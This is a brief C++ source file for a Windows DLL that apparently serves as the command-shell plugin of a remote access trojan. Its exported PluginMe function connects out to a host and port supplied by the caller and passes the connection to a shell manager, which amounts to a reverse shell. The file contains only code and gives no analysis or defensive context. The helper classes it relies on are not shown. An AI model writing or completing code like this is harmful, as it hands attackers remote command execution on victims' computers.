// Cmd.cpp : Defines the entry point for the DLL application.
//
#include "stdafx.h"
#include "ClientSocket.h"
#include "MyShellManager.h"

extern "C" __declspec(dllexport) BOOL PluginMe(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	CClientSocket socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;

	CMyShellManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}

BOOL APIENTRY mymain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	return TRUE;
}